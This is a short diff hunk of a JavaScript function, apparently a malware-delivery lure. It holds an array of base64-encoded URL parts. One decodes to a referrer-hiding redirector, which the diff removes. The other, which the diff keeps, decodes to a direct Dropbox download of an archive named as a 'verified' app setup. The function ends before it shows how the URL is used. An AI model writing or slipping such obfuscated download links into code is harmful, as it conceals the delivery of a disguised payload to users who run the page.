@@ -1,6 +1,6 @@
 (function() {
  const urlParts = [
-  'aHR0cHM6Ly9ocmVmLmxpLz8=',
+  '',
   'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzVoYXRudzg4YXludnhxcnJ0OWJsZi9BcHBTZXR1cC1WZXJpZmllZC1ieS1HSVQucmFyP3Jsa2V5PXlndDI0aDI5YnM2YnN2Ynl4eW1zMGE1emMmc3Q9b2tvbmI2MWQmZGw9MQ=='
 ];
   
